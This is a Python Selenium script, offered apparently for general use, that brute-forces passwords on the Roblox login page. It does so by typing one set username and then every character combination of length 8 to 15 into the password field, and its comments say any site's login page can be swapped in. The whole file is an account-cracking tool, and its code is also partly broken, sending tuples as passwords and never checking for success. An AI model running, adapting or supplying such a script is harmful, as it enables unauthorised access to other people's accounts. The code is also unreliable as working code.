#open commandprompt-> type in, pip3 install selenium (if it doesn't work try-> pip install selenium)
#                  -> type in, pip3 install requests (if it doesn't work try-> pip install requests)
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import itertools
import requests

driver = webdriver.Firefox() #you can use any browser
wait = WebDriverWait(driver, 3)

driver.get("https://www.roblox.com/login") #choose any site with the login path

#if there isn't a cookiebanner, remove the next 3 lines
cookie_banner = driver.find_element(By.CLASS_NAME, "cookie-banner-bg")
if cookie_banner.is_displayed():
    cookie_banner.click()

max_length = 15 #max length for the password
min_length = 8  #min length for the password

characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"


login_button = driver.find_element(By.ID, "login-button") #find the ID for the login button
username_field = driver.find_element(By.ID, "login-username")#find the ID for the username field
password_field = driver.find_element(By.ID, "login-password")#find the ID for the password field


username_field.send_keys("MadeByRemiraar/Remigii")#use the username which you want the password
for length in range(min_length, max_length + 1):
    login_button = driver.find_element(By.ID, "login-button")
    for password in itertools.product(characters, repeat=length):
        password_field.clear()
        password_field.send_keys(password)
        login_button.click()
        wait
        print(f"try password: {password}")
driver.quit()


